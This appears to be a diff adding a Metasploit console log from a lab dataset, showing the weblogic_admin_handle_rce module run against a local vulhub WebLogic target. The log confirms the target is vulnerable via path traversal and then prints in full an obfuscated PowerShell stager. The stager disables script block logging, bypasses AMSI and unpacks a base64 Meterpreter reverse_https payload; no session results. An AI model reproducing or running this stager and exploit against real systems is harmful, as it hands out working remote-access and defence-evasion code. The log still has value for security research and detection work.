@@ -1,0 +1,40 @@
+[*] Processing /home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/weblogic_14882/run.rc for ERB directives.
+resource (/home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/weblogic_14882/run.rc)> spool /home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/weblogic_14882/scan.stdout
+[*] Spooling to file /home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/weblogic_14882/scan.stdout...
+resource (/home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/weblogic_14882/run.rc)> use exploit/multi/http/weblogic_admin_handle_rce
+[*] Using configured payload windows/x64/meterpreter/reverse_https
+resource (/home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/weblogic_14882/run.rc)> set RHOSTS 127.0.0.1
+RHOSTS => 127.0.0.1
+resource (/home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/weblogic_14882/run.rc)> set RPORT 18023
+RPORT => 18023
+resource (/home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/weblogic_14882/run.rc)> set LHOST 127.0.0.1
+LHOST => 127.0.0.1
+resource (/home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/weblogic_14882/run.rc)> set TARGETURI /
+TARGETURI => /
+resource (/home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/weblogic_14882/run.rc)> set SSL false
+SSL => false
+resource (/home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/weblogic_14882/run.rc)> set VERBOSE true
+VERBOSE => true
+resource (/home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/weblogic_14882/run.rc)> check
+[+] 127.0.0.1:18023 - The target is vulnerable. Path traversal successful.
+resource (/home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/weblogic_14882/run.rc)> run -j
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+resource (/home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/weblogic_14882/run.rc)> sleep 25
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started HTTPS reverse handler on https://127.0.0.1:8443
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target is vulnerable. Path traversal successful.
+[*] Executing PowerShell Stager for windows/x64/meterpreter/reverse_https
+[*] Powershell command length: 4866
+[*] Executing command: powershell.exe -nop -w hidden -noni -c "if([IntPtr]::Size -eq 4){$b=$env:windir+'\sysnative\WindowsPowerShell\v1.0\powershell.exe'}else{$b='powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c  $aNjq=((''Enable''+''Sc{1}ip''+''t''+''{''+''3}''+''loc{2}{0}ogging'')-f''L'',''r'',''k'',''B''); $oogr=((''''+''{''+''1}c{0}iptB{2}ockLog''+''gi''+''ng'')-f''r'',''S'',''l'');If($PSVersionTable.PSVersion.Major -ge 3){ $avAdm=[Ref].Assembly.GetType(((''{4''+''}y''+''st''+''em.{2}an''+''a{5}ement.{1}uto''+''mation.{''+''0}ti{3}s''+'''')-f''U'',''A'',''M'',''l'',''S'',''g'')); $dbqk=((''''+''{5''+''}n''+''ableScript''+''{0}loc{4}{2}''+''n{1}ocation{''+''3''+''}ogging'')-f''B'',''v'',''I'',''L'',''k'',''E''); $zfFmI=[Collections.Generic.Dictionary[string,System.Object]]::new(); $f7=$avAdm.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); $mi0P=[Ref].Assembly.GetType(((''''+''{5''+''}{''+''0''+''}stem''+''.{3''+''}{9}n''+''{''+''9}{4}ement.{7}''+''{''+''1''+''}t{''+''8}m{9}ti{''+''8}n''+''.''+''{7''+''}''+''msi''+''{2}''+''ti{''+''6}s'')-f''y'',''u'',''U'',''M'',''g'',''S'',''l'',''A'',''o'',''a'')); if ($mi0P) { $mi0P.GetField(((''a{4}''+''{3}i{''+''2}ni''+''tFai''+''{1''+''}{''+''0''+''}''+''d'')-f''e'',''l'',''I'',''s'',''m''),''NonPublic,Static'').SetValue($null,$true); }; If ($f7) { $gnQWB=$f7.GetValue($null); $zfFmI.Add($dbqk,0); $zfFmI.Add($aNjq,0); $gnQWB[''HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\''+$oogr]=$zfFmI; If($gnQWB[$oogr]){ $gnQWB[$oogr][$aNjq]=0; $gnQWB[$oogr][$dbqk]=0; } } Else { [Ref].Assembly.GetType(((''''+''Sy{1''+''}''+''tem''+''.{5}a''+''na{2}''+''ement.Automation.Sc{0}i{4}t''+''Bloc{3}''+'''')-f''r'',''s'',''g'',''k'',''p'',''M'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''H4sIAEdsc2oCA7VXbW/iSBL+vtL+B2uFhFEIMZBkmJFGOhtsMGM7GL/xsuhk7MZuaNvEbgfI7v73reYlyexk7uZOmpYQdHdVdfVTT1UXqzIN{0}M5SLhlzf/z6C3ceIz/3E46vxHmdq+QTs/a6VQmS2OY+c/xc3G57WeLjdPHpU7fMc5TS07zRR1QsCpQsCUYFX+P+5LwY5ej6YblGAeX''+''+4Cr/bvRJtvTJWezQ9YMYcddiGrI9LQt85lXD2hJM+ervv1dr8+vmoiE/lj4p+{0}p1{0}Ch{0}''+''GiEh1R''+''r3V40daB+2i{0}/qOMizIlvRhofTdqvhpIW/QgZYe0I6onEWFlW4zO''+''t1ckTLPD3dipk5CfFV+Dn{0}s0AMwxwVRbXOzdkB88XiX/z8fPq4TClOUENN{0}cqzrYXyJxygojHw05CgMVotQMuiOU6jRa0GYk/ZBvGVtCSkzv0vZngD7S7Y/agS/1YJpEY0r9Uhou/cU8/CkqCTZvUdR4EFNRhnJg''+''B6fzEAVx''+''fmrD5sR+9w53XhMubHHQQO86OswEflz5xQ53Q42qdZfoBpxc5LVFu8wM1VqLdS6z9qrXlRBcV8nW/GsDZ''+''3MxwuXi18Ff/{0}eh''+''ogJvR9NvfQCqeod0j9BAcXwvLvBQWtCDqC0riIGeAiXz1voLCHCIp8ymBm3PhGTU4''+''wfdGVSkxClIsBBLYAryDmta+dOUWOr6qpjhLA7zQHslZWkCboIn1OjcPldDYHoWqX+EVR50Yl5GlQ5yzkExTWOTEt8HlLLGl2/Fl9dVcvCcWBX9CLuUXtH3Cej+1maUHzMoDIAgS2tUUB9glDpM4NcIikg4Wjy/HVd/Ho+o''+''RA+oClJ4gHrDAcLMr4koOnR27UGhaiarIl{0}AGZY91QiB9BlTgnyZFgfoT''+''C6nccveTCifgMmQskb''+''9yEcFsko3XOxTmF{0}sRQPjLs/3Lj2wJ09{0''+''}ebo3N8+EuezaUDZYlQ{0}fcS4+kZpCMkOQU4lDxLJL9A97enWsP/diPj3t2olz2LMGRlbLqS5bgzVQ+HxF{0}pNZWx5sSxiptqBPODI/fvLGnZagvRiApb1eoNxLy3j1eiWqjyQDqYTUkMBviDO5QcB3RxVzPXe1UMpSSaRN''+''PuTh3FXgcO62qRGsG3pMaBJMzkSBJkSzO70hBkTSxE09umIWNht+n{0}65uD09cMNQY74FvQLcxgMOw5srSz11G4UpSHUGm2mjHIixvLHJi''+''zTV/rycd5wObmtJCxrExNl9mQkOduJU9WZqa7VaOrXWS62s2tEkuwru{0}9trVuYDSbgAO1reVd2/futsvEFQAjz1LT2FzmzU03sG4+urZzFY8ZfLb38d739sXU6jS1tRh9UULQGT+F''+''bT2yiRnptljqvSJyW6Q01uYHdRC1DJgH6fRet/Vn0NmqckimLfqkPas7k''+''GefvSrPtkHiJst29HSWEz3X8G17IMJn6DQNqSySTvIwuWmi6AvzRbfVNsiVevd2Lypwp0AZ7''+''ju9Dyrz86Tz{0}DI98vhw5cBVEX5kelqL3gf9WUuzDUP3hoIphLntEm3cok1XkPfLidIOB''+''sbBS5WV345by9TIrclwOlOk0iNmG22mgtublUgZrwLX0Fz''+''FaBq{0}lAUCzZCt78bPSmGtjeEy2QgPfcWa9e82bmt3602IoidEmiXT9lJxtzOPqnqy9QJZb6FkVk5abuIlRu56xiCYxDttouwtryNMyccnf+2aflunM2fc1vvDkTdw2q7jPE+FoeC09nfhhlqBA+up8jzbSQwL29so0yMOAr4Ve1+ymF1elMwjluWdj3X7pung4T7Jvk''+''wEPOx42cojwyzq6ZAnyfC2n8mmS6Ry0y1JqYGssN8phg/c2DO7L3FZy1oQga3pRAzH''+''VN13+qq8E0XgT+mlYwz8UW86HwWxLJ/vZYH5YHveVvQ2yVCAPJLldMDEYV0qo+6VO+oxv2ywrWIUqnilqDjcQmxFkcXWmqZ35jJzkysjZ7ajjhmx/CoTX5OESNrdgh/h''+''bLprxo+iAv4Xzwexk980zc+ff4M6Mnd''+''wStutRSWSM''+''Htxf/2l8uy8qSXfayZ0Py9in0CNgS7hUu2VLFfOT/8ow0yD56F53{0}A8RQQ6LujJLiVSJCQLWNdxbBGg4zn1IawtctSjR+/9qnEvgrXXbuSy9OnTDHyEmgvls{0}GhN{0}JxXdi3BQH6CGEv3B5r649frJttDzyzVWeNCMBytkyOlsEYXnE8/7OBgk6Twov3fai+hxqcvIEHCl7M05vBsJOyjLxF7nipFwq8gQ3was{0}l56zFZNQA7Wv0C{0}8Z68DednSV5eFnsuX86MXwFf43tryu/YfdH2{0}QUGfAfLP49c{0}bhuGnXd/zMQU5C55ugk4N5fsonNPjTWSXB+D+6jzY36yHkl4b0LYfe4e/AZTpnejcDQAA'')-f''K'')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);"
+resource (/home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/weblogic_14882/run.rc)> sessions
+
+Active sessions
+===============
+
+No active sessions.
+
+resource (/home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/weblogic_14882/run.rc)> spool off
+[*] Spooling is now disabled
+resource (/home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/weblogic_14882/run.rc)> exit
